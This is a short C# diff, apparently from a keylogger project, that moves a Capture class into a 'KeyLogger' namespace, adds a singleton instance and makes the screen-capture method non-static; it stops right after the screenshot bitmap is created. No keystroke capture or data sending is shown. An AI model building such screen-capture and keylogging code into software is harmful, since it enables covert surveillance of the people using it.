@@ -8,17 +8,36 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
-namespace key
+namespace key.KeyLogger
 {
     public class Capture
     {
+
+        private static Capture _Instance;
+
+        public static Capture Instance
+        {
+            get
+            {
+                if (_Instance == null)
+                {
+                    _Instance = new Capture();
+                }
+                return _Instance;
+            }
+            private set
+            {
+
+            }
+        }
+        public Capture() { }
         #region Capture
 
 
         /// <summary>
         /// Capture al screen then save into ImagePath
         /// </summary>
-        public static void CaptureScreen()
+        public void CaptureScreen()
         {
             //Create a new bitmap.
             var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
